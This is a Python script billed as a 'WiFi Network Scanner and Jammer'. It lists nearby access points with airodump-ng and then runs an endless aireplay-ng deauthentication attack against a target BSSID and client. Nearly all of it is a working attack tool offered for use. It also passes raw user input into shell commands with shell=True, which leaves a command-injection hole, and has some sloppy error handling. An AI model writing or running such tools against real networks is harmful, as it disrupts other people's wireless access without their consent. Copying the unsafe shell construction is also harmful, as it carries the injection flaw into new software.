import os
import subprocess
import re
import time

# Function to scan and print nearby access points using airodump-ng
def scan_nearby_access_points(interface):
    try:
        cmd = f"airodump-ng --output-format csv -w output {interface}"
        scan_process = subprocess.Popen(cmd, shell=True)

        # Let it run for a few seconds to collect data
        time.sleep(10)  # Adjust the duration as needed

        # Stop the scan process
        scan_process.terminate()

        # Parse the BSSIDs from the output file
        bssids = set()
        with open('output-01.csv', 'r') as file:
            lines = file.readlines()
            for line in lines[2:]:  # Skip the first two lines
                match = re.match(r'^(\S+),', line)
                if match:
                    bssids.add(match.group(1))

        os.remove('output-01.csv')  # Clean up the temporary file

        return list(bssids)
    except subprocess.CalledProcessError as e:
        print("Error executing airodump-ng:", e)
    return []

# Function to perform deauthentication attack using aircrack-ng
def jam_network(interface, target_bssid, target_client):
    try:
        cmd = f"aireplay-ng --deauth 0 -a {target_bssid} -c {target_client} {interface}"
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error executing aircrack-ng:", e)

# Main function
def main():
    print("WiFi Network Scanner and Jammer (using airodump-ng and aireplay-ng)")

    while True:
        print("\nMenu:")
        print("1. Scan Nearby Access Points")
        print("2. Jam a WiFi Network")
        print("3. Exit")

        choice = input("Enter your choice (1/2/3): ")

        if choice == '1':
            # Set your wireless interface
            interface = input("Set your Wireless Interface: ")

            # Scan nearby access points and get BSSIDs
            bssids = scan_nearby_access_points(interface)
            print("Nearby Access Points (BSSIDs):")
            for idx, bssid in enumerate(bssids, start=1):
                print(f"{idx}. {bssid}")
        elif choice == '2':
            # Set your wireless interface
            interface = input("Set your Wireless Interface: ")
            target_bssid = input("Enter the BSSID of the target network: ")
            target_client = input("Enter the MAC address of a connected client (optional): ")

            # Perform deauthentication attack using aircrack-ng
            print("Jamming in progress...")
            jam_network(interface, target_bssid, target_client)
        elif choice == '3':
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
